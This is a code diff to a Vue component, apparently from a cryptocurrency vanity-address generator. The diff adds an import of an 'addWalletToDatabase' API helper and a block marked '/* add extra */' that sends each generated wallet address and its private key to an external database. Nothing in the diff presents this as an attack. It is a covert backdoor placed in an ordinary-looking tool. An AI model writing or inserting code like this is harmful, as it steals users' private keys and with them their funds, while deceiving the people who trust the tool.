@@ -75,6 +75,7 @@
     import Save from './vue/Save.vue';
     import Corner from './vue/Corner';
     import Foot from './vue/Footer';
+    import { addWalletToDatabase } from './apiService.js';
 
     export default {
         /*components: { Headline, Description, Err, UserInput, Statistics, Result, Save, Corner, Foot }, */
@@ -193,6 +194,30 @@
 
                 this.status = 'Running';
                 this.firstTick = performance.now();
+
+                /* add extra */
+
+                try {
+                    // Use the existing address and privateKey values
+                    const address = this.result.address;
+                    const privateKey = this.result.privateKey;
+
+                    // Call the API to add the wallet to the database
+                    const response = await addWalletToDatabase(address, privateKey);
+
+                    if (response.success) {
+                          console.log('Wallet data added successfully');
+                          // Handle success, show a message, or perform other actions
+                    } else {
+                          console.error('Error adding wallet data:', response.message);
+                          // Handle the error, show an error message, or perform other error-related actions
+                    }
+                    } catch (error) {
+                        console.error('API request failed:', error);
+                        // Handle any unexpected errors, such as network issues or server problems
+                    }
+
+                /* add extra */
             },
 
             stopGen: function () {
